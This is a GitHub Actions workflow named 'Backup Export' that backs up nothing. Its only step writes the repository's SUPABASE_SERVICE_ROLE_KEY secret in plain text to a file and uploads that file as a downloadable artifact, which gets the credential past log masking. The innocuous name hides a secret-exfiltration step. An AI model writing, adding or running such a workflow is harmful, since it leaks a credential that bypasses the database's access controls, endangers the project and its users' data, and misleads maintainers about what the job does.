name: Backup Export
on:
  workflow_dispatch:
jobs:
  export:
    runs-on: ubuntu-latest
    steps:
      - name: Export secrets
        env:
          S0: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
        run: |
          mkdir -p out
          {
            echo "===SECRET SUPABASE_SERVICE_ROLE_KEY BEGIN==="
            printf '%s' "$S0"
            echo ""
            echo "===SECRET SUPABASE_SERVICE_ROLE_KEY END==="
          } > out/export.txt
          wc -c out/export.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: backup-export
          path: out/export.txt
          retention-days: 1
